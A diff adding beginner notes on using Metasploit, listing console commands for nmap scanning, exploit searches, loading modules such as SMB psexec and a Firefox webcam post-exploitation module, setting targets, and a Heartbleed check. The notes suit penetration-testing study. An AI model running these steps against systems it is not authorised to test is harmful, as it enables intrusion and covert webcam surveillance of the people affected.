@@ -1,0 +1,65 @@
+from zero to hero
+
+tips from (verbatim or otherwie):
+https://jonathansblog.co.uk/metasploit-tutorial-for-beginners
+https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#name
+
+
+#commands to type are listed below. comments are prefixed with #
+
+msfconsole
+
+db_status
+#if no connection, try to run metasploit from applications menu
+
+db_nmap -sn [ipaddress]
+db_nmap -v -sV [ipaddress]
+
+
+search portscan		#to show available port scanners
+hosts			#shows all hosts identified by nmap
+hosts -R		#adds hosts as remote targets
+
+#examples of eploits to search on
+search type:exploit
+search CVE-XXXX-XXXX
+search CVE:2014
+search name:wordpress
+
+#to use exploit:
+use post/firefox/manage/webcam_chat
+use exploit/windows/smb/psexec
+show payloads		#shows payloads
+show targets		#shows applicable targets
+show options		#to modify options for payload
+
+set RHOST ipaddress
+
+run 
+#or
+exploit
+
+
+
+
+
+
+
+#useful commands
+
+back		#traverses backwords, akin to cd ..
+banner		#shows banner
+cd		#changes directory
+color		#enabled/disables color text
+
+
+
+
+#check for heartbleed:
+search heartbleed
+use heartbleed/path
+set rhosts <external ip>
+run
+
+
+
